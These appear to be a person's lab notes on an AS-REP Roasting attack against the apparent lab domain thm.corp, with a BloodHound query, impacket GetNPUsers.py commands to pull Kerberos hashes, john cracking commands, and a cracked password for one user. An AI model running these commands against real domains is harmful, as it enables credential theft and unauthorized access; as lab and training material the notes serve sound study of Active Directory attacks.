AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos **pre-authentication disabled**, which we can then attempt to crack offline. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

You have credentials from the `AUTOMATE` user.

Use `GetNPUsers.py`, alternatively, we could also use Bloodhound to find them.

## Analyzing the BloodHound data

- In the `Analysis` section, you can find `Pre-Built Analytics Queries`.
- Run the `Find AS-REP Roastable Users (DontReqPreAuth)` Query.
	![[Screenshot from 2024-08-13 20-21-19.png]]
	There are 3 users that do not have `Kerberos pre-authentication` enabled.
## Getting hashes

- Paste the users into a file:

	```bash
	echo -e 'TABATHA_BRITT\nERNESTO_SILVA\nLEANN_LONG' > users
	```

- Use the `impacket` script `GetNPUsers.py` to perform the attack.

	`GetNPUsers.py -request thm.corp/ -usersfile users -format john -outputfile hashes.asreproast`

	![[Screenshot from 2024-08-19 20-00-04.png]]

- Crack them using `john`.
	`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast`

### Impackets script `GetNPUsers.py`

`GetNPUsers.py` can be used to query those users; it will attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).

`GetNPUsers.py`: Extracts Kerberos AS-REQ messages for users without pre-authentication. If successful, it might generate a `.ccache` file containing the obtained tickets.
### Query AUTOMATE user

- `GetNPUsers.py thm.corp/AUTOMATE` and provide the password of `AUTOMATE` to get all AS-REProastbale users.

	![[Screenshot from 2024-08-11 20-58-47.png]]

### Query TABATHA_BRITT user

- `GetNPUsers.py thm.corp/TABATHA_BRITT`
	You don't need a password.
	![[Screenshot from 2024-08-11 21-04-21.png]]

### Cracking TABATHA_BRITT'S hash

- Copy the hash to file tabatha_hash.txt.
- Run `john --wordlist=/usr/share/wordlists/rockyou.txt tabatha_hash.txt`    
	![[Screenshot from 2024-08-11 21-17-33.png]]
	marlboro(1985)

**Next step:** [[Bloodhound]]
